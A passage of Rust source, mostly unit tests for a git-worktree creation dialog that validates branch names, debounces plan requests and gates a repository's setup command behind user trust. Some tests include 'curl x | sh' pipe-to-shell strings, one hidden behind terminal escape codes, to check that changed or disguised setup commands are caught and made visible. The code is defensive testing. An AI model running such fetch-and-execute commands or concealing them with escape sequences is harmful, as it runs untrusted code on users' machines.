            let mut s = text(&p.pattern, p.matches);
            if p.claude {
                s = format!("{s} - {}", t().recipe_from_claude);
            }
            if p.incomplete {
                s = format!("{s} - {}", t().recipe_incomplete);
            }
            (s, if p.matches == 0 { theme::TEXT_DIM } else { theme::TEXT })
        }
    };
    recipe.copy.iter().map(|p| line(p, t().recipe_copy_line)).chain(recipe.symlink.iter().map(|p| line(p, t().recipe_link_line))).collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shell::i18n::{self, Lang};
    use crate::shell::world::{CommandTemplate, Project};
    use egui::Rect;
    use protocol::{LocalBranch, LocationIssue};

    fn plan(folder: &str, location: Option<&str>) -> WorktreePlan {
        WorktreePlan {
            id: 1,
            key: "p".into(),
            branches: vec![
                LocalBranch { name: "main".into(), checked_out: Some("/home/me/shop".into()) },
                LocalBranch { name: "topic".into(), checked_out: None },
                LocalBranch { name: "wip".into(), checked_out: Some("/home/me/shop-wip".into()) },
            ],
            current_branch: Some("wip".into()),
            default_branch: Some("origin/main".into()),
            folder: folder.into(),
            location: location.map(String::from),
            path: Some(format!("/home/me/shop/.claude/worktrees/{folder}")),
            problem: None,
            free_folder: None,
            exclude: None,
            recipe: None,
        }
    }

    fn form(name: &str) -> Form {
        Form { mode: Mode::New, name: name.into(), base: "origin/main".into(), existing: None, location: DEFAULT_WORKTREE_LOCATION.into(), folder: folder_for_branch(name) }
    }

    fn refusals(issues: &[(Field, Issue)]) -> Vec<(Field, Problem)> {
        issues.iter().filter_map(|(f, i)| if let Issue::Refused(p) = i { Some((*f, p.clone())) } else { None }).collect()
    }

    fn shop() -> World {
        let mut world = World::default();
        let templates = vec![CommandTemplate { name: "Claude".into(), command: "claude".into(), task: false }];
        world.projects.push(Project {
            id: "p".into(),
            name: "shop".into(),
            color: [0; 3],
            rect: Rect::ZERO,
            cwd: Some("/home/me/shop".into()),
            templates,
            messages: Vec::new(),
            worktree_location: None,
            task_settings: Default::default(),
        });
        world
    }

    /// Answers the dialog's last plan question.
    fn answer(d: &mut CreateDialog, folder: &str) {
        let id = d.asked.as_ref().unwrap().id;
        d.handle(&AgentEvent::WorktreePlan(Box::new(WorktreePlan { id, ..plan(folder, None) })));
    }

    #[test]
    fn branch_names_follow_git_rules() {
        for ok in ["invoices", "feat/invoices", "fix-1.2", "caf\u{e9}", "a.b/c_d", "UPPER"] {
            assert!(branch_name_valid(ok), "{ok}");
        }
        for bad in ["", "-x", "--force", "a..b", "x.lock", "a/b.lock/c", "@", "HEAD", "@{-1}", "a b", "a~1", "a^", "a:b", "a?", "a*", "a[", "a\\b", "/x", "x/", "a//b", ".x", "a/.b", "x.", "a\tb"] {
            assert!(!branch_name_valid(bad), "{bad:?}");
        }
    }

    #[test]
    fn the_form_is_checked_field_by_field() {
        let p = plan("feat-invoices", None);
        assert_eq!(check(&form("feat/invoices"), Some(&p)), vec![]);
        let f = form("feat/invoices");
        assert_eq!(f.request(Some(&p), true).unwrap().branch, WorktreeBranch::New { name: "feat/invoices".into(), base: "origin/main".into() });
        assert!(f.request(Some(&p), true).unwrap().exclude);
        // Nothing typed yet: missing, not refused (nothing said, the button stays off).
        let empty = check(&form(""), Some(&plan("worktree", None)));
        assert!(empty.contains(&(Field::Branch, Issue::Missing)) && refusals(&empty).is_empty(), "{empty:?}");
        assert_eq!(refusals(&check(&form("-x"), Some(&plan("x", None)))), vec![(Field::Branch, Problem::InvalidBranchName { branch: "-x".into() })]);
        assert_eq!(refusals(&check(&form("topic"), Some(&plan("topic", None)))), vec![(Field::Branch, Problem::BranchExists { branch: "topic".into() })]);
        let mut no_base = form("a");
        no_base.base = " ".into();
        assert!(check(&no_base, Some(&plan("a", None))).contains(&(Field::Base, Issue::Missing)));
        no_base.base = "--orphan".into();
        assert_eq!(refusals(&check(&no_base, Some(&plan("a", None)))), vec![(Field::Base, Problem::BaseNotFound { base: "--orphan".into() })]);
        let mut escaping = form("a");
        escaping.location = "../../{name}".into();
        assert_eq!(refusals(&check(&escaping, None)), vec![(Field::Location, Problem::LocationRefused { location: "../../{name}".into(), issue: LocationIssue::ParentDir })]);
        let mut windows = form("a");
        windows.location = "aux/{name}".into();
        assert_eq!(refusals(&check(&windows, None)), vec![(Field::Location, Problem::LocationRefused { location: "aux/{name}".into(), issue: LocationIssue::WindowsName })]);
        // The plan for another folder, or none yet: not ready, nothing refused.
        assert_eq!(check(&form("a"), Some(&plan("b", None))), vec![(Field::Folder, Issue::Missing)]);
        assert_eq!(check(&form("a"), None), vec![(Field::Folder, Issue::Missing)]);
        assert!(form("a").request(None, false).is_none());
        // What the agent found for this folder goes next to its field.
        let taken = WorktreePlan { path: None, problem: Some(Problem::DestinationExists { path: "/x".into() }), free_folder: Some("a-2".into()), ..plan("a", None) };
        assert_eq!(refusals(&check(&form("a"), Some(&taken))), vec![(Field::Folder, Problem::DestinationExists { path: "/x".into() })]);
    }

    #[test]
    fn an_existing_branch_must_be_free() {
        let p = plan("topic", None);
        let existing = |name: Option<&str>| Form { mode: Mode::Existing, existing: name.map(String::from), folder: folder_for_branch(name.unwrap_or_default()), ..form("ignored") };
        assert_eq!(check(&existing(Some("topic")), Some(&p)), vec![]);
        assert_eq!(existing(Some("topic")).request(Some(&p), false).unwrap().branch, WorktreeBranch::Existing { name: "topic".into() });
        assert!(check(&existing(None), Some(&plan("worktree", None))).contains(&(Field::Branch, Issue::Missing)));
        let wip = check(&existing(Some("wip")), Some(&plan("wip", None)));
        assert_eq!(refusals(&wip), vec![(Field::Branch, Problem::BranchCheckedOut { branch: "wip".into(), path: "/home/me/shop-wip".into() })]);
        let gone = check(&existing(Some("gone")), Some(&plan("gone", None)));
        assert_eq!(refusals(&gone), vec![(Field::Branch, Problem::BranchNotFound { branch: "gone".into() })]);
        assert_eq!(free_branches(&p), vec!["topic"]);
    }

    #[test]
    fn bases_offer_the_default_then_the_current_branch() {
        i18n::set(Lang::Fr);
        let choices = base_choices(&plan("x", None));
        let values: Vec<&str> = choices.iter().map(|(v, _)| v.as_str()).collect();
        assert_eq!(values, vec!["origin/main", "wip", "main", "topic"]);
        assert_eq!(choices[0].1, "origin/main (par défaut)");
        assert_eq!(choices[1].1, "wip (actuelle)");
    }

    #[test]
    fn agent_problems_go_next_to_their_field() {
        assert_eq!(field_of(&Problem::BranchCheckedOut { branch: "a".into(), path: "/x".into() }), Field::Branch);
        assert_eq!(field_of(&Problem::BaseNotFound { base: "x".into() }), Field::Base);
        assert_eq!(field_of(&Problem::LocationRefused { location: "x".into(), issue: LocationIssue::Escapes }), Field::Location);
        assert_eq!(field_of(&Problem::DestinationExists { path: "/x".into() }), Field::Folder);
        assert_eq!(field_of(&Problem::WorktreeRegistered { path: "/x".into() }), Field::Folder);
        assert_eq!(field_of(&Problem::GitFailed { detail: "x".into() }), Field::General);
    }

    #[test]
    fn plans_are_asked_once_the_typing_pauses() {
        let t0 = Instant::now();
        let ms = |n| t0 + Duration::from_millis(n);
        let asked = |folder: &str, answered| Asked { id: 1, folder: folder.into(), location: None, at: t0, answered };
        assert!(plan_due(None, ("worktree", None), t0, t0), "the first question at once");
        // Typing: the folder changes on every key; asked once it stayed the same a moment.
        assert!(!plan_due(Some(&asked("a", true)), ("ab", None), ms(100), ms(150)));
        assert!(plan_due(Some(&asked("a", true)), ("ab", None), ms(100), ms(300)));
        // The same question: never again once answered; again after a while if not.
        assert!(!plan_due(Some(&asked("ab", true)), ("ab", None), t0, ms(60_000)));
        assert!(!plan_due(Some(&asked("ab", false)), ("ab", None), t0, ms(5_000)));
        assert!(plan_due(Some(&asked("ab", false)), ("ab", None), t0, t0 + PLAN_RETRY));
        // Another location is another question.
        assert!(plan_due(Some(&asked("ab", true)), ("ab", Some("../{repo}-{name}")), t0, ms(250)));
    }

    #[test]
    fn a_silent_agent_is_said_after_a_few_unanswered_plans() {
        let mut d = CreateDialog::new("p".into(), None);
        let t0 = Instant::now();
        let mut events = vec![];
        d.ask_plan(&mut events, t0);
        d.ask_plan(&mut events, t0 + PLAN_RETRY);
        assert!(!d.agent_silent());
        d.ask_plan(&mut events, t0 + PLAN_RETRY * 2);
        assert_eq!(events.len(), 3);
        assert!(d.agent_silent());
        answer(&mut d, "worktree");
        assert!(!d.agent_silent(), "it answered");
    }

    #[test]
    fn a_dialog_debounces_its_questions_and_sends_once() {
        let world = shop();
        let mut d = CreateDialog::new("p".into(), None);
        let t0 = Instant::now();
        let mut events = vec![];
        d.ask_plan(&mut events, t0);
        d.ask_plan(&mut events, t0);
        assert_eq!(events.len(), 1, "asked once for the same folder");
        let first = d.asked.as_ref().unwrap().id;
        // Typed quickly: nothing asked until the name stays the same for a moment.
        for (i, name) in ["f", "fe", "feat", "feat/invoices"].iter().enumerate() {
            d.name = name.to_string();
            d.ask_plan(&mut events, t0 + Duration::from_millis(50 * i as u64));
        }
        assert_eq!(events.len(), 1);
        d.ask_plan(&mut events, t0 + Duration::from_millis(150 + 250));
        let Event::ToAgent(AgentCmd::PlanWorktree { folder, .. }) = &events[1] else { panic!("a plan") };
        assert_eq!((events.len(), folder.as_str()), (2, "feat-invoices"));
        // An answer to an older question is not taken.
        d.handle(&AgentEvent::WorktreePlan(Box::new(WorktreePlan { id: first, ..plan("worktree", None) })));
        assert!(d.plan.is_none());
        answer(&mut d, "feat-invoices");
        assert_eq!(d.form().base, "origin/main", "the default branch, unless chosen");
        d.template = Some(0);
        d.exclude = true;
        let mut sent = vec![];
        let first_sent = d.submit(&world, &Trust::default(), &mut sent, t0).expect("sent");
        assert!(d.submit(&world, &Trust::default(), &mut sent, t0).is_none(), "once");
        assert_eq!(first_sent, Sent { id: first_sent.id, project: "p".into(), command: Some("claude".into()), setup: None, repo: None, location: None, task: None });
        let Event::ToAgent(AgentCmd::CreateWorktree { id, request, .. }) = &sent[0] else { panic!("a creation") };
        assert_eq!(*id, first_sent.id);
        assert!(!request.exclude, "the plan found the folder ignored: nothing to add");
        // Refused: said next to its field while the form is the same.
        let refusal = Problem::BranchExists { branch: "feat/invoices".into() };
        assert!(!d.handle(&AgentEvent::WorktreeCreated { id: *id, key: "p".into(), path: None, problem: Some(refusal.clone()), excluded: false, recipe_pending: false }));
        assert!(!d.creating());
        let f = d.form();
        assert_eq!(d.problems(&f, &check(&f, d.plan_for(&f)), Field::Branch), vec![refusal]);
        d.name = "feat/invoices-2".into();
        let f = d.form();
        assert!(d.problems(&f, &[], Field::Branch).is_empty(), "another name: the refusal is no longer about it");
    }

    #[test]
    fn git_still_running_keeps_the_dialog_waiting_without_expiry() {
        let world = shop();
        let mut d = CreateDialog::new("p".into(), None);
        let t0 = Instant::now();
        d.name = "a".into();
        d.ask_plan(&mut vec![], t0);
        answer(&mut d, "a");
        let sent = d.submit(&world, &Trust::default(), &mut vec![], t0).unwrap();
        let still = AgentEvent::WorktreeCreated { id: sent.id, key: "p".into(), path: None, problem: Some(Problem::GitStillRunning { secs: 60 }), excluded: false, recipe_pending: false };
        assert!(!d.handle(&still));
        d.expire(t0 + PENDING_TIMEOUT * 3);
        assert!(d.creating() && !d.no_answer, "git is working: no expiry");
        let done = AgentEvent::WorktreeCreated { id: sent.id, key: "p".into(), path: Some("/w".into()), problem: None, excluded: false, recipe_pending: false };
        assert!(d.handle(&done), "done");
    }

    #[test]
    fn any_success_opens_the_card_whatever_became_of_the_dialog() {
        i18n::set(Lang::Fr);
        let world = shop();
        let sent = Sent { id: 4, project: "p".into(), command: Some("claude".into()), setup: None, repo: None, location: Some("../{repo}-{name}".into()), task: None };
        let path = "/home/me/shop-a";
        let (events, keep) = on_created(&sent, Some(path), None, false, &world);
        assert!(!keep);
        assert!(
            matches!(&events[..], [Event::SetProjectWorktreeLocation(p, Some(l)), Event::NewCard { at: None, project: Some(g), command: Some(c), setup: None, cwd: Some(cwd) }] if p == "p" && l == "../{repo}-{name}" && g == "p" && c == "claude" && cwd == path),
            "{events:?}"
        );
        // Still running: keep waiting for the final answer.
        let (events, keep) = on_created(&sent, None, Some(&Problem::GitStillRunning { secs: 60 }), false, &world);
        assert!(events.is_empty() && keep);
        // Refused: nothing to open.
        assert_eq!(on_created(&sent, None, Some(&Problem::BranchExists { branch: "a".into() }), false, &world).0.len(), 0);
        // The group went meanwhile: a notice names the folder.
        let (events, _) = on_created(&sent, Some(path), None, false, &World::default());
        assert!(
            matches!(&events[..], [Event::Inform { title, body }] if title == "Worktree créé" && body == "/home/me/shop-a a été créé, mais son groupe n'existe plus : aucun terminal ouvert"),
            "{events:?}"
        );
    }

    #[test]
    fn a_taken_folder_can_be_swapped_for_a_free_one() {
        let mut d = CreateDialog::new("p".into(), Some("../{repo}-{name}".into()));
        d.name = "invoices".into();
        assert_eq!(d.form().location_sent().as_deref(), Some("../{repo}-{name}"));
        d.folder_choice = Some(("invoices".into(), "invoices-2".into()));
        assert_eq!(d.form().folder, "invoices-2");
        d.name = "taxes".into();
        assert_eq!(d.form().folder, "taxes", "only for the name it was chosen for");
    }

    fn recipe(setup: Option<&str>) -> Recipe {
        let pattern = |p: &str, claude, matches, refused| RecipePattern { pattern: p.into(), claude, matches, refused, incomplete: false };
        Recipe {
            main: "/home/me/shop".into(),
            copy: vec![pattern(".env", false, 1, None), pattern("config/*.local", false, 2, None), pattern("../x", false, 0, Some(protocol::PatternIssue::ParentDir))],
            symlink: vec![pattern("node_modules", false, 1, None), RecipePattern { incomplete: true, ..pattern("vendor", true, 0, None) }],
            setup: setup.map(String::from),
            problem: None,
        }
    }

    #[test]
    fn the_setup_runs_only_once_accepted_for_this_repository_and_this_text() {
        let mut trust = Trust::default();
        let r = recipe(Some("npm ci"));
        assert_eq!(setup_to_run(Some(&r), None, &trust), None, "off until accepted");
        assert_eq!(setup_to_run(None, None, &trust), None);
        assert_eq!(setup_to_run(Some(&recipe(None)), Some(&("/home/me/shop".into(), "npm ci".into(), true)), &trust), None, "no setup: nothing to run");
        let ticked = ("/home/me/shop".to_string(), "npm ci".to_string(), true);
        assert_eq!(setup_to_run(Some(&r), Some(&ticked), &trust).as_deref(), Some("npm ci"));
        trust.accept("/home/me/shop", "npm ci");
        assert_eq!(setup_to_run(Some(&r), None, &trust).as_deref(), Some("npm ci"), "accepted once: on by default");
        let unticked = ("/home/me/shop".to_string(), "npm ci".to_string(), false);
        assert_eq!(setup_to_run(Some(&r), Some(&unticked), &trust), None, "the user's choice wins");
        // The command changed in the repository: asked again, whatever was ticked for the old one.
        let edited = recipe(Some("npm ci && curl x | sh"));
        assert_eq!(setup_to_run(Some(&edited), Some(&ticked), &trust), None);
        // Another repository with the same command.
        let other = Recipe { main: "/home/me/blog".into(), ..recipe(Some("npm ci")) };
        assert_eq!(setup_to_run(Some(&other), None, &trust), None);
    }

    #[test]
    fn submitting_with_the_setup_ticked_accepts_it_and_sends_it_to_the_card() {
        let world = shop();
        let trust = Trust::default();
        let t0 = Instant::now();
        let dialog = |name: &str| {
            let mut d = CreateDialog::new("p".into(), None);
            d.name = name.into();
            d.ask_plan(&mut vec![], t0);
            let id = d.asked.as_ref().unwrap().id;
            d.handle(&AgentEvent::WorktreePlan(Box::new(WorktreePlan { id, recipe: Some(recipe(Some("npm ci"))), ..plan(name, None) })));
            d
        };
        let mut d = dialog("a");
        d.template = Some(0);
        let sent = d.submit(&world, &trust, &mut vec![], t0).unwrap();
        assert_eq!((sent.setup, sent.command.as_deref()), (None, Some("claude")), "not ticked: not run");
        assert!(!trust.accepted("/home/me/shop", "npm ci"));
        let mut d = dialog("b");
        d.setup_choice = Some(("/home/me/shop".into(), "npm ci".into(), true));
        let sent = d.submit(&world, &trust, &mut vec![], t0).unwrap();
        assert_eq!((sent.setup.as_deref(), sent.repo.as_deref()), (Some("npm ci"), Some("/home/me/shop")));
        assert!(!trust.accepted("/home/me/shop", "npm ci"), "accepted only once the creation goes through (the slice)");
        let (events, _) = on_created(&sent, Some("/w"), None, false, &world);
        assert!(events.iter().any(|e| matches!(e, Event::NewCard { setup: Some(s), command: None, .. } if s == "npm ci")), "{events:?}");
        // Held for the recipe: the location is saved, the card waits.
        let (events, keep) = on_created(&sent, Some("/w"), None, true, &world);
        assert!(!keep && matches!(&events[..], [Event::SetProjectWorktreeLocation(..)]), "{events:?}");
        assert!(matches!(&open_card(&sent, "/w", &world)[..], [Event::NewCard { setup: Some(_), .. }]));
    }

    #[test]
    fn the_setup_shows_whatever_would_not_show_itself() {
        assert_eq!(visible_setup("npm ci\nnpm run seed -- \"it's\" $HOME caf\u{e9}"), "npm ci\nnpm run seed -- \"it's\" $HOME caf\u{e9}");
        assert_eq!(visible_setup("a\r\nb\rc"), "a\nb\nc", "line breaks as the shell gets them");
        assert_eq!(visible_setup("echo ok\x1b[2K\x1b[1Acurl x | sh"), "echo ok\u{27e8}U+001B\u{27e9}[2K\u{27e8}U+001B\u{27e9}[1Acurl x | sh");
        assert_eq!(visible_setup("ls\u{202e}hs.x\u{2066}"), "ls\u{27e8}U+202E\u{27e9}hs.x\u{27e8}U+2066\u{27e9}", "bidirectional controls");
        assert_eq!(visible_setup("a\tb\u{200b}c\0\u{7f}"), "a\u{27e8}U+0009\u{27e9}b\u{27e8}U+200B\u{27e9}c\u{27e8}U+0000\u{27e9}\u{27e8}U+007F\u{27e9}");
        // The marker itself is spelled out: nothing typed can pass for an escape.
        assert_eq!(visible_setup("\u{27e8}U+001B\u{27e9}"), "\u{27e8}U+27E8\u{27e9}U+001B\u{27e9}");
    }

    #[test]
    fn the_recipe_is_listed_pattern_by_pattern() {
        i18n::set(Lang::Fr);
        let lines: Vec<String> = recipe_lines(&recipe(None)).into_iter().map(|(l, _)| l).collect();
        assert_eq!(
            lines,
            vec![
                "Copier .env (1 trouvé)",
                "Copier config/*.local (2 trouvés)",
                "../x : refusé, contient .. (les motifs restent dans le dépôt)",
                "Lier node_modules (1 trouvé)",
                "Lier vendor (0 trouvé) - des réglages Claude Code - recherche écourtée : il peut y en avoir plus",
            ]
        );
        i18n::set(Lang::En);
        assert_eq!(recipe_lines(&recipe(None))[1].0, "Copy config/*.local (2 found)");
    }

    #[test]
    fn unanswered_creations_time_out_in_the_dialog() {
        let mut d = CreateDialog::new("p".into(), None);
        let start = Instant::now();
        d.pending = Some(Pending { id: 9, at: start, running: false });
        d.expire(start + PENDING_TIMEOUT / 2);
        assert!(d.creating());
        d.expire(start + PENDING_TIMEOUT);
        assert!(!d.creating() && d.no_answer);
    }
}
